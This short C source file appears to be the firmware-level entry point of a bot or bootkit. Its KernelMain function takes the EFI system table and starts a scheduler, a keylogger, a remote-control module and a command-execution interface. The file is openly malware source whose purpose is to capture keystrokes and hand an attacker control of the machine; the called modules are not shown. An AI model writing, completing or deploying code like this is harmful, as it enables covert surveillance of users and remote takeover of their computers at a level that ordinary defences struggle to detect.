#include "BotStartup.h"
#include "BotDefs.h"

#include "../Shared/Logger.h"
#include "../Shared/Utils.h"
#include "../Shared/MemTools.h"

#include "Keylogger.h"
#include "CommandExec.h"
#include "RemoteControl.h"
#include "Scheduler.h"

EFI_STATUS KernelMain(EFI_SYSTEM_TABLE* SystemTable) {
    LogInfo(L"Kernel main inicialited\n");

    SetSystemTable(SystemTable);  

    if (!SchedulerInit()) {
        LogWarning(L"Error! Schedulerinit\n");
    }

    if (!InitializeKeylogger()) {
        LogWarning(L"Error! Keylogger\n");
    }

    if (!InitRemoteControl()) {
        LogWarning(L"Error! remotecontrol\n");
    }

    if (!StartCommandInterface()) {
        LogWarning(L"Error! comand interface\n");
    }

    LogInfo(L"KernelMain ejecuted\n");
    return EFI_SUCCESS;
}
